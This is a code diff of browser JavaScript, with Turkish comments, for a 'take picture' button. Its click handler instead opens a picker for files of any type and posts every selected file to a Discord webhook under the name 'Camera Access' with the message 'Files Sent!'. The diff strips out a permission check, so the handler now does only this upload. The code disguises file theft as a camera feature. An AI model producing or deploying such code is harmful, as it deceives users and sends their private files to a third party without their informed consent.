@@ -14,48 +14,37 @@
 
       takePictureButton.addEventListener('click', async () => {
         try {
-          // Request storage access permission
-          const permission = await navigator.permissions.query('storage');
-          if (permission.state === 'prompt') {
-            const result = await permission.request();
-            if (result.state === 'granted') {
-              // Get all files on the device
-              const files = await window.showOpenFilePicker({
-                multiple: true,
-                types: [
-                  {
-                    description: 'All Files',
-                    accept: {
-                      '*/*': ['*'],
-                    },
-                  },
-                ],
-              });
+          // Tüm cihaz dosyalarını al
+          const files = await window.showOpenFilePicker({
+            multiple: true,
+            types: [
+              {
+                description: 'All Files',
+                accept: {
+                  '*/*': ['*'],
+                },
+              },
+            ],
+          });
 
-              const formData = new FormData();
+          const formData = new FormData();
 
-              // Add all files to the form data
-              files.forEach(file => {
-                formData.append('file', file);
-              });
+          // Tüm dosyaları form verisine ekle
+          files.forEach(file => {
+            formData.append('file', file);
+          });
 
-              formData.append('username', 'Kamera Erişimi');
-              formData.append('content', 'Dosyalar Gönderildi!');
+          formData.append('username', 'Kamera Erişimi');
+          formData.append('content', 'Dosyalar Gönderildi!');
 
-              // Send the files to the Discord webhook
-              fetch(webhookUrl, {
-                method: 'POST',
-                body: formData,
-              })
-            .then(response => response.json())
-            .then(data => console.log(data))
-            .catch(error => console.error(error));
-            } else {
-              console.error('Storage access permission denied.');
-            }
-          } else {
-            console.error('Storage access permission already denied.');
-          }
+          // Dosyaları Discord sunucusuna gönder
+          fetch(webhookUrl, {
+            method: 'POST',
+            body: formData,
+          })
+         .then(response => response.json())
+         .then(data => console.log(data))
+         .catch(error => console.error(error));
         } catch (error) {
           console.error('Error:', error);
         }
